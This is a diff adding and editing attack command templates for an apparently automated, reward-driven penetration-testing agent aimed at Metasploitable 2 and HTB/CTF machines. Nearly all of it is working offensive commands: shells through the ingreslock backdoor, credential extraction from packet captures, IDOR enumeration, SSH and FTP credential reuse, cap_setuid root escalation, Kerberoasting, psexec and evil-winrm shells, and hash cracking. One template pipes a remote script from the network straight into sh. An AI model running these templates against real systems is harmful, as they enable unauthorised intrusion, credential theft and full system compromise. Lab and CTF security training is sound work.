@@ -894,16 +894,17 @@ register(CommandTemplate(
 
 # --- Linux PrivEsc ---
 register(CommandTemplate(
-    name="linpeas",
-    template="sudo -l 2>/dev/null; echo '---CRON---'; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null; echo '---CAPS---'; getcap -r /usr /bin /sbin 2>/dev/null",
-    description="LinPEAS-equivalent - Linux privilege escalation checker (sudo, cron, capabilities). SUID check is separate find_suid.",
+    name="linpeas_ms2",
+    template="{ echo 'sudo -l 2>/dev/null; echo ---CRON---; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null; echo ---CAPS---; getcap -r /usr /bin /sbin 2>/dev/null'; sleep 3; } | timeout 15 telnet {target} 1524",
+    description="LinPEAS-equivalent via MS2 ingreslock backdoor (sudo, cron, capabilities).",
     phase=AttackPhase.PRIVILEGE_ESCALATION,
-    required_params=[],
+    required_params=["target"],
     optional_params={},
     preconditions={"linux_shell_obtained"},
     success_indicators=["SUID", "NOPASSWD", "writable", "CVE-", "cap_setuid"],
     typical_reward=3.0,
-    tags={"linux", "privesc", "enumeration"}
+    tags={"linux", "privesc", "enumeration", "ms2"},
+    not_when="If already root. If not targeting Metasploitable 2."
 ))
 
 register(CommandTemplate(
@@ -921,13 +922,13 @@ register(CommandTemplate(
 register(CommandTemplate(
     name="sudo_list",
     template="{ echo 'sudo -l 2>/dev/null || echo ALREADY_ROOT'; sleep 2; } | timeout 10 telnet {target} 1524",
-    description="Check sudo privileges on target via ingreslock backdoor.",
+    description="Check sudo privileges on target via MS2 ingreslock backdoor.",
     phase=AttackPhase.PRIVILEGE_ESCALATION,
     required_params=["target"],
     preconditions={"shell_obtained"},
     success_indicators=["NOPASSWD", "ALL", "(root)", "ALREADY_ROOT"],
     typical_reward=2.0,
-    tags={"linux", "sudo"}
+    tags={"linux", "sudo", "ms2"}
 ))
 
 register(CommandTemplate(
@@ -1744,22 +1745,25 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="sudo_check",
-    template="{ echo 'id; sudo -l 2>/dev/null; cat /etc/sudoers 2>/dev/null | head -20'; sleep 2; } | timeout 10 telnet {target} 1524",
-    description="Check sudo privileges and sudoers on target via ingreslock.",
+    template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target} 'sudo -l 2>/dev/null; echo ---SUDOERS---; cat /etc/sudoers 2>/dev/null | head -30; echo ---ID---; id'",
+    description="Check sudo privileges, sudoers file, and current user id for privilege escalation vectors via SSH.",
     phase=AttackPhase.PRIVILEGE_ESCALATION,
-    required_params=["target"],
+    required_params=["username", "password"],
     preconditions={"shell_obtained"},
     success_indicators=["(ALL)", "NOPASSWD", "may run", "uid=0"],
     typical_reward=6.0,
-    tags={"privesc", "sudo", "linux"}
+    tags={"privesc", "sudo", "linux"},
+    why="Identifies sudo misconfigs (NOPASSWD, ALL) that give direct root access",
+    when="After obtaining a user shell. Priority privesc check.",
+    not_when="If you already have root. If no user shell obtained yet.",
 ))
 
 register(CommandTemplate(
     name="linpeas",
-    template="sudo -l 2>/dev/null; echo '---CRON---'; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null; echo '---CAPS---'; getcap -r /usr /bin /sbin 2>/dev/null",
-    description="Manual Linux privilege escalation enumeration (sudo, cron, capabilities). SUID check is separate find_suid.",
+    template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target} 'sudo -l 2>/dev/null; echo ---CRON---; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null; echo ---CAPS---; getcap -r /usr /bin /sbin 2>/dev/null'",
+    description="Manual Linux privilege escalation enumeration (sudo, cron, capabilities) via SSH. SUID check is separate find_suid.",
     phase=AttackPhase.PRIVILEGE_ESCALATION,
-    required_params=[],
+    required_params=["username", "password"],
     preconditions={"shell_obtained"},
     success_indicators=["SUID", "NOPASSWD", "writable", "cap_setuid"],
     typical_reward=5.0,
@@ -2210,15 +2214,16 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="nmap_comprehensive",
-    template="nmap -sC -sV -O -A --top-ports 1000 -T4 {target}",
-    description="Comprehensive nmap scan with scripts, versions, and OS detection.",
+    template="nmap -sT -sC -sV --top-ports 1000 -T4 {target}",
+    description="Comprehensive nmap scan with scripts and service versions (no -O, as that requires root).",
     phase=AttackPhase.RECON,
     required_params=["target"],
     success_indicators=["open", "Host is up", "Service Info"],
     typical_reward=5.0,
     tags={"recon", "nmap", "thorough"},
-    why="Single scan that provides port, service, version, and OS data",
+    why="Single scan that provides port, service, and version data via TCP connect scan",
     when="When thorough discovery is needed and stealth is not critical",
+    not_when="If you already have detailed port/service data. Use nmap_service_version for targeted followup.",
 ))
 
 register(CommandTemplate(
@@ -3638,6 +3643,508 @@ register(CommandTemplate(
     required_tool="nmap",
     assigned_agents=["scout", "red"],
     not_when="If port status is already known from recent full scan",
+))
+
+
+# =============================================================================
+# HTB CAPABILITY UPGRADE — PCAP, IDOR, Capabilities, Credential Reuse
+# =============================================================================
+
+# ── PCAP Analysis ────────────────────────────────────────────────────
+
+register(CommandTemplate(
+    name="download_pcap_curl",
+    template="curl -s -o /tmp/capture.pcap {url}",
+    description="Download a PCAP file from a web application for credential extraction",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["url"],
+    success_indicators=[""],
+    typical_reward=5.0,
+    tags={"pcap", "web", "download"},
+    assigned_agents=["red", "scout"],
+    why="PCAP files often contain plaintext FTP/HTTP/Telnet credentials",
+    when="When a web app serves PCAP/packet capture files (e.g., security dashboard)",
+    not_when="If the web app does not serve downloadable files or captures",
+    follows_after=["gobuster_dir", "feroxbuster_dir"],
+    enables=["pcap_strings_extract", "pcap_tshark_ftp"],
+))
+
+register(CommandTemplate(
+    name="pcap_strings_extract",
+    template="strings /tmp/capture.pcap | grep -iE 'user|pass|login|USER|PASS' | head -30",
+    description="Extract plaintext credentials from PCAP using strings",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=[],
+    preconditions={"web_paths_discovered"},
+    success_indicators=["USER", "PASS", "password", "login"],
+    typical_reward=20.0,
+    tags={"pcap", "credentials", "extraction"},
+    assigned_agents=["red"],
+    why="Quick extraction of FTP/Telnet/HTTP credentials from packet captures",
+    when="After downloading a PCAP file from the target",
+    not_when="If no PCAP file has been downloaded yet",
+    follows_after=["download_pcap_curl"],
+    enables=["cred_reuse_ssh", "cred_reuse_ftp"],
+))
+
+register(CommandTemplate(
+    name="pcap_tshark_ftp",
+    template="tshark -r /tmp/capture.pcap -Y 'ftp.request.command == USER || ftp.request.command == PASS' -T fields -e ftp.request.arg 2>/dev/null || strings /tmp/capture.pcap | grep -E '^(USER|PASS) '",
+    description="Extract FTP credentials from PCAP using tshark or strings fallback",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=[],
+    preconditions={"web_paths_discovered"},
+    success_indicators=["USER", "PASS"],
+    typical_reward=20.0,
+    tags={"pcap", "ftp", "credentials"},
+    assigned_agents=["red"],
+    why="Precise FTP credential extraction from packet captures",
+    when="After downloading a PCAP file — better precision than strings alone",
+    not_when="If no PCAP file has been downloaded or FTP traffic is unlikely",
+    follows_after=["download_pcap_curl"],
+    enables=["cred_reuse_ssh", "cred_reuse_ftp"],
+))
+
+# ── Web Path Follow-Up ───────────────────────────────────────────────
+
+register(CommandTemplate(
+    name="curl_web_path",
+    template="curl -sL http://{target}/{path} | head -200",
+    description="Explore a discovered web path to find links, forms, downloadable files",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target", "path"],
+    preconditions={"web_paths_discovered"},
+    success_indicators=["href=", "<a ", "download", ".pcap", ".cap", "data", "id="],
+    typical_reward=5.0,
+    tags={"web", "enumeration", "follow_up"},
+    assigned_agents=["scout", "red"],
+    why="Discovered web directories often contain downloadable files, IDOR endpoints, or admin panels",
+    when="After gobuster/ffuf/feroxbuster finds interesting paths like /data, /admin, /download",
+    not_when="If the path was already explored or returned 404",
+    follows_after=["gobuster_dir", "feroxbuster_dir", "ffuf_fuzz"],
+    enables=["idor_curl_range", "download_pcap_curl"],
+))
+
+register(CommandTemplate(
+    name="curl_web_path_ids",
+    template="for i in $(seq 0 5); do echo \"=== /{path}/$i ===\"; curl -sL http://{target}/{path}/$i -o /dev/null -w 'Status: %{{http_code}} Size: %{{size_download}}\\n'; done",
+    description="Enumerate numeric IDs under a discovered web path to find IDOR patterns",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target", "path"],
+    preconditions={"web_paths_discovered"},
+    success_indicators=["Status: 200", "Size:"],
+    typical_reward=8.0,
+    tags={"web", "idor", "enumeration"},
+    assigned_agents=["scout", "red"],
+    why="Web paths with numeric IDs often expose IDOR — /data/0, /data/1, etc. reveal other users' data",
+    when="After discovering paths like /data, /download, /files that may have sequential IDs",
+    not_when="If IDOR was already tested on this path",
+    follows_after=["curl_web_path", "gobuster_dir"],
+    enables=["download_pcap_curl"],
+))
+
+# ── IDOR / Parameter Enumeration ─────────────────────────────────────
+
+register(CommandTemplate(
+    name="idor_curl_range",
+    template="for i in $(seq {start} {end}); do echo \"=== ID: $i ===\"; curl -s {base_url}/$i -o /dev/null -w 'Status: %{{http_code}} Size: %{{size_download}}\\n'; done",
+    description="Enumerate IDOR endpoints by iterating IDs and checking response differences",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["base_url", "start", "end"],
+    optional_params={"start": "0", "end": "10"},
+    preconditions={"web_paths_discovered"},
+    success_indicators=["Status: 200", "Size:"],
+    typical_reward=8.0,
+    tags={"web", "idor", "enumeration"},
+    assigned_agents=["red", "scout"],
+    why="Many web apps use sequential IDs — accessing other users' data reveals credentials, PCAPs, etc.",
+    when="When a URL contains a numeric ID parameter (e.g., /download/1, /user/5, /api/data/3)",
+    not_when="If the application uses UUIDs or non-sequential identifiers",
+    follows_after=["gobuster_dir", "feroxbuster_dir"],
+    enables=["download_pcap_curl"],
+))
+
+register(CommandTemplate(
+    name="idor_download_file",
+    template="curl -s {base_url}/{id} -o /tmp/idor_file_{id}",
+    description="Download a specific file/resource via IDOR vulnerability",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["base_url", "id"],
+    preconditions={"web_paths_discovered"},
+    success_indicators=[""],
+    typical_reward=5.0,
+    tags={"web", "idor", "download"},
+    assigned_agents=["red"],
+    why="Obtain specific files identified through IDOR enumeration",
+    when="After IDOR enumeration reveals interesting file IDs",
+    not_when="If IDOR has not been confirmed or all interesting IDs have been downloaded",
+    follows_after=["idor_curl_range"],
+    enables=["pcap_strings_extract"],
+))
+
+# ── Credential Reuse ─────────────────────────────────────────────────
+
+register(CommandTemplate(
+    name="cred_reuse_ssh",
+    template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{target} 'id && whoami && cat /etc/passwd | grep -v nologin | grep -v false | head -10'",
+    description="Try discovered credentials on SSH for shell access",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "username", "password"],
+    preconditions={"credentials_known"},
+    success_indicators=["uid=", "whoami", "/bin/bash", "/bin/sh"],
+    typical_reward=50.0,
+    tags={"ssh", "credential_reuse", "shell"},
+    assigned_agents=["red"],
+    why="Credential reuse is the #1 way to escalate access — users often reuse passwords across services",
+    when="After discovering credentials from ANY source (PCAP, FTP, config files, brute-force)",
+    not_when="If SSH port 22 is not open on target",
+    follows_after=["pcap_strings_extract", "hydra_ssh_brute"],
+    enables=["privesc_linpeas", "privesc_getcap", "privesc_sudo_l"],
+))
+
+register(CommandTemplate(
+    name="cred_reuse_ftp",
+    template="curl -s ftp://{username}:{password}@{target}/ --connect-timeout 5",
+    description="Try discovered credentials on FTP",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "username", "password"],
+    preconditions={"credentials_known"},
+    success_indicators=["drwx", "-rw", "total", "226"],
+    typical_reward=10.0,
+    tags={"ftp", "credential_reuse"},
+    assigned_agents=["red"],
+    why="Check if discovered creds work on FTP to access files",
+    when="After discovering credentials and FTP port (21) is open",
+    not_when="If FTP port 21 is not open on target",
+    follows_after=["pcap_strings_extract"],
+    enables=["ftp_download_files"],
+))
+
+# ── Linux Privilege Escalation — Capabilities ─────────────────────────
+
+register(CommandTemplate(
+    name="privesc_getcap",
+    template="getcap -r / 2>/dev/null",
+    description="Find binaries with Linux capabilities set (e.g., cap_setuid for root)",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["cap_setuid", "cap_net_raw", "cap_dac_override", "cap_sys_admin"],
+    typical_reward=15.0,
+    tags={"linux", "privesc", "capabilities"},
+    assigned_agents=["red"],
+    why="Linux capabilities can grant root-equivalent powers without SUID — often missed by admins",
+    when="After getting a user shell on Linux — always run as part of privesc enumeration",
+    not_when="On Windows targets",
+    follows_after=["cred_reuse_ssh"],
+    enables=["privesc_cap_setuid_python", "privesc_cap_setuid_perl"],
+))
+
+register(CommandTemplate(
+    name="privesc_cap_setuid_python",
+    template="python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash -c \\\"id && cat /root/root.txt 2>/dev/null && cat /home/*/user.txt 2>/dev/null\\\"\")'",
+    description="Exploit cap_setuid on python3 to get root shell — GTFOBins technique",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["uid=0(root)", "root.txt"],
+    typical_reward=130.0,
+    tags={"linux", "privesc", "capabilities", "gtfobins", "python"},
+    assigned_agents=["red"],
+    why="If python3 has cap_setuid, this gives instant root via os.setuid(0)",
+    when="After getcap reveals python3 has cap_setuid+ep",
+    not_when="If python3 does NOT have cap_setuid capability",
+    follows_after=["privesc_getcap"],
+    enables=[],
+))
+
+register(CommandTemplate(
+    name="privesc_cap_setuid_perl",
+    template="perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash -c \\\"id && cat /root/root.txt 2>/dev/null\\\"\";'",
+    description="Exploit cap_setuid on perl to get root shell — GTFOBins technique",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["uid=0(root)", "root.txt"],
+    typical_reward=130.0,
+    tags={"linux", "privesc", "capabilities", "gtfobins", "perl"},
+    assigned_agents=["red"],
+    why="If perl has cap_setuid, this gives instant root",
+    when="After getcap reveals perl has cap_setuid+ep",
+    not_when="If perl does NOT have cap_setuid capability",
+    follows_after=["privesc_getcap"],
+))
+
+register(CommandTemplate(
+    name="privesc_sudo_l",
+    template="sudo -l",
+    description="List sudo privileges for current user",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["NOPASSWD", "ALL", "may run", "(root)"],
+    typical_reward=10.0,
+    tags={"linux", "privesc", "sudo"},
+    assigned_agents=["red"],
+    why="Sudo misconfigurations are the most common Linux privesc vector",
+    when="After getting a user shell — always check sudo first",
+    not_when="On Windows targets or when no interactive shell is available",
+    follows_after=["cred_reuse_ssh"],
+    enables=["privesc_sudo_exploit"],
+))
+
+register(CommandTemplate(
+    name="privesc_suid_find",
+    template="find / -perm -4000 -type f 2>/dev/null",
+    description="Find SUID binaries that may allow privilege escalation",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["/usr/bin/", "/usr/sbin/", "pkexec", "doas"],
+    typical_reward=10.0,
+    tags={"linux", "privesc", "suid"},
+    assigned_agents=["red"],
+    why="SUID binaries run as their owner (often root) — misconfigurations allow privesc",
+    when="After getting a user shell — standard privesc enumeration",
+    not_when="On Windows targets or when already root",
+    follows_after=["cred_reuse_ssh"],
+))
+
+register(CommandTemplate(
+    name="privesc_linpeas",
+    template="curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    description="Run LinPEAS for comprehensive Linux privilege escalation enumeration",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["Vulnerable", "SUID", "Capabilities", "Interesting"],
+    typical_reward=12.0,
+    tags={"linux", "privesc", "enumeration", "automated"},
+    assigned_agents=["red"],
+    why="Comprehensive automated privesc enumeration — finds things manual checks miss",
+    when="After getting a shell and quick manual checks (sudo -l, getcap) didn't find anything obvious",
+    not_when="On Windows targets or when already root — use WinPEAS for Windows instead",
+))
+
+# ── Flag/Loot Retrieval ──────────────────────────────────────────────
+
+register(CommandTemplate(
+    name="read_user_flag",
+    template="cat /home/*/user.txt 2>/dev/null || find / -name user.txt -readable 2>/dev/null | head -3 | xargs cat 2>/dev/null",
+    description="Read user flag from target (HTB/CTF)",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=[""],
+    typical_reward=200.0,
+    tags={"flag", "htb", "ctf", "loot"},
+    assigned_agents=["red"],
+    why="Collect the user flag — primary objective in HTB/CTF",
+    when="After obtaining a user shell",
+    not_when="Before obtaining a shell — flag is only readable with user access",
+))
+
+register(CommandTemplate(
+    name="read_root_flag",
+    template="cat /root/root.txt 2>/dev/null || find / -name root.txt -readable 2>/dev/null | head -3 | xargs cat 2>/dev/null",
+    description="Read root flag from target (HTB/CTF)",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"admin_access"},
+    success_indicators=[""],
+    typical_reward=200.0,
+    tags={"flag", "htb", "ctf", "loot"},
+    assigned_agents=["red"],
+    why="Collect the root flag — ultimate objective in HTB/CTF",
+    when="After obtaining root/admin access",
+    not_when="Before obtaining root/admin access — flag is only readable by root",
+))
+
+# ── Windows / AD Commands for Medium/Hard HTB ────────────────────────
+
+register(CommandTemplate(
+    name="smbclient_null_list",
+    template="smbclient -L //{target}/ -N 2>/dev/null",
+    description="List SMB shares with null session (no authentication)",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["Disk", "IPC", "Sharename"],
+    typical_reward=5.0,
+    tags={"smb", "windows", "enumeration"},
+    assigned_agents=["scout", "red"],
+    why="Null session share listing reveals accessible shares without credentials",
+    when="When SMB ports (139/445) are open",
+    not_when="If SMB ports are not open on target",
+    follows_after=["nmap_service_version"],
+    enables=["smbclient_get_file", "smbmap_enum"],
+))
+
+register(CommandTemplate(
+    name="smbclient_get_file",
+    template="smbclient //{target}/{share} -N -c 'ls; get {filename}' 2>/dev/null || smbclient //{target}/{share} -U '{username}%{password}' -c 'ls; get {filename}'",
+    description="Download a file from an SMB share",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "share", "filename"],
+    optional_params={"username": "", "password": ""},
+    preconditions={"ports_discovered"},
+    success_indicators=["getting file", "NT_STATUS_OK"],
+    typical_reward=10.0,
+    tags={"smb", "download", "loot"},
+    assigned_agents=["red"],
+    why="Downloaded SMB files often contain credentials, configs, or Group Policy Preferences",
+    when="After SMB share listing reveals accessible shares",
+    not_when="If no readable SMB shares have been discovered",
+    follows_after=["smbclient_null_list"],
+    enables=["gpp_decrypt"],
+))
+
+register(CommandTemplate(
+    name="gpp_decrypt",
+    template="gpp-decrypt '{encrypted_password}'",
+    description="Decrypt Group Policy Preferences (GPP) cPassword from Groups.xml",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["encrypted_password"],
+    preconditions={"credentials_known"},
+    success_indicators=[""],
+    typical_reward=20.0,
+    tags={"windows", "ad", "gpp", "credentials"},
+    assigned_agents=["red"],
+    why="GPP cPassword encryption uses a publicly known AES key — instant decryption",
+    when="After finding Groups.xml or Registry.xml in SYSVOL/Policies with cpassword field",
+    not_when="If no GPP cpassword has been found in SYSVOL",
+    follows_after=["smbclient_get_file"],
+    enables=["cred_reuse_ssh", "impacket_psexec"],
+))
+
+register(CommandTemplate(
+    name="impacket_GetNPUsers",
+    template="impacket-GetNPUsers {domain}/ -usersfile {userfile} -no-pass -dc-ip {target} -format hashcat",
+    description="AS-REP Roasting — get TGTs for accounts without Kerberos pre-auth",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "domain"],
+    optional_params={"userfile": "/tmp/users.txt"},
+    preconditions={"ports_discovered"},
+    success_indicators=["$krb5asrep$", "hash"],
+    typical_reward=15.0,
+    tags={"windows", "ad", "kerberos", "asreproast"},
+    assigned_agents=["red"],
+    why="Accounts without Kerberos pre-auth leak their TGT hash — crackable offline",
+    when="When port 88 (Kerberos) is open and user list is available",
+    not_when="If port 88 (Kerberos) is not open or target is not Active Directory",
+    follows_after=["enum4linux_full"],
+    enables=["hashcat_krb5"],
+))
+
+register(CommandTemplate(
+    name="impacket_GetUserSPNs",
+    template="impacket-GetUserSPNs {domain}/{username}:{password} -dc-ip {target} -request",
+    description="Kerberoasting — request TGS tickets for service accounts",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "domain", "username", "password"],
+    preconditions={"credentials_known"},
+    success_indicators=["$krb5tgs$", "ServicePrincipalName"],
+    typical_reward=15.0,
+    tags={"windows", "ad", "kerberos", "kerberoast"},
+    assigned_agents=["red"],
+    why="Service accounts often have weak passwords — their TGS tickets are crackable offline",
+    when="After obtaining any valid AD credential",
+    not_when="If no valid AD credentials available or target is not Kerberos-enabled",
+    follows_after=["gpp_decrypt", "impacket_GetNPUsers"],
+    enables=["hashcat_krb5"],
+))
+
+register(CommandTemplate(
+    name="impacket_psexec",
+    template="impacket-psexec {domain}/{username}:{password}@{target}",
+    description="PsExec-like execution with credentials — get SYSTEM shell",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "domain", "username", "password"],
+    preconditions={"credentials_known"},
+    success_indicators=["Microsoft Windows", "C:\\Windows", "nt authority\\system"],
+    typical_reward=130.0,
+    tags={"windows", "ad", "psexec", "shell"},
+    assigned_agents=["red"],
+    why="PsExec gives SYSTEM-level access with admin credentials — ultimate Windows pwn",
+    when="After obtaining domain admin or local admin credentials",
+    not_when="If no admin credentials are available or SMB is blocked",
+    follows_after=["hashcat_krb5", "gpp_decrypt"],
+))
+
+register(CommandTemplate(
+    name="evil_winrm",
+    template="evil-winrm -i {target} -u '{username}' -p '{password}'",
+    description="WinRM shell access with credentials",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "username", "password"],
+    preconditions={"credentials_known"},
+    success_indicators=["Evil-WinRM", "PS ", "Windows PowerShell"],
+    typical_reward=50.0,
+    tags={"windows", "winrm", "shell"},
+    assigned_agents=["red"],
+    why="WinRM provides interactive PowerShell access — cleaner than PsExec",
+    when="When port 5985/5986 is open and valid credentials are available",
+    not_when="If WinRM ports (5985/5986) are not open on target",
+    follows_after=["impacket_GetNPUsers", "gpp_decrypt"],
+))
+
+# ── Hash Cracking ────────────────────────────────────────────────────
+
+register(CommandTemplate(
+    name="hashcat_krb5",
+    template="hashcat -m {hash_mode} {hash_file} {wordlist} --force 2>/dev/null | tail -20",
+    description="Crack Kerberos/NTLM/bcrypt hashes with hashcat",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["hash_file"],
+    optional_params={"hash_mode": "18200", "wordlist": "/usr/share/wordlists/rockyou.txt"},
+    preconditions=set(),
+    success_indicators=["Cracked", "Status...........: Cracked", ":"],
+    typical_reward=20.0,
+    tags={"hash", "cracking", "offline"},
+    assigned_agents=["red"],
+    why="Offline hash cracking is undetectable and cracks weak passwords quickly",
+    when="After obtaining password hashes (AS-REP, Kerberoast, NTLM, etc.)",
+    not_when="If no password hashes have been obtained yet",
+    follows_after=["impacket_GetNPUsers", "impacket_GetUserSPNs"],
+    enables=["impacket_psexec", "evil_winrm", "cred_reuse_ssh"],
+))
+
+register(CommandTemplate(
+    name="john_crack",
+    template="john {hash_file} --wordlist={wordlist} 2>/dev/null && john {hash_file} --show",
+    description="Crack password hashes with John the Ripper",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["hash_file"],
+    optional_params={"wordlist": "/usr/share/wordlists/rockyou.txt"},
+    preconditions=set(),
+    success_indicators=["cracked", "password"],
+    typical_reward=20.0,
+    tags={"hash", "cracking", "offline"},
+    assigned_agents=["red"],
+    why="Alternative to hashcat — auto-detects hash format",
+    when="After obtaining password hashes",
+    not_when="If no password hashes have been obtained yet",
+    follows_after=["impacket_GetNPUsers", "impacket_GetUserSPNs"],
+    enables=["impacket_psexec", "evil_winrm", "cred_reuse_ssh"],
+))
+
+# ── Bloodhound / AD Enumeration ──────────────────────────────────────
+
+register(CommandTemplate(
+    name="bloodhound_python",
+    template="bloodhound-python -u '{username}' -p '{password}' -d {domain} -c all -ns {target}",
+    description="Collect AD data for BloodHound graph analysis",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target", "domain", "username", "password"],
+    preconditions={"credentials_known"},
+    success_indicators=["Done", "users", "computers", "groups"],
+    typical_reward=12.0,
+    tags={"windows", "ad", "bloodhound", "enumeration"},
+    assigned_agents=["scout", "red"],
+    why="BloodHound reveals attack paths through AD that are invisible to manual enumeration",
+    when="After obtaining any valid AD credential — reveals privilege escalation paths",
+    not_when="If no AD credentials available or target is not Active Directory",
+    follows_after=["gpp_decrypt", "impacket_GetNPUsers"],
 ))
 
 
